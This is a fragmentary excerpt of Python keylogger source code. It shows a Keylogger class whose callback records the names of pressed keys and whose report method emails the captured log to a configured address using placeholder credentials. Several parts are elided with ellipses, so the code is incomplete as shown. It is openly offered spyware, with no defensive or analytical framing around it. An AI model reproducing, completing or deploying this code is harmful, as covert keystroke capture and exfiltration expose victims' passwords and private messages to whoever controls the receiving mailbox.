...
EMAIL_ADDRESS = 'email to receive logs'
EMAIL_PASS = 'email password'


class Keylogger:
    def __init__(self, interval, report_method='email'):
        # We'll pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string that contains the log of all
    ...
    def callback(self, event):
        ...
        (when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
    ...
    def report(self):
        ...
        if self.log:
            ...
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASS, self.log)
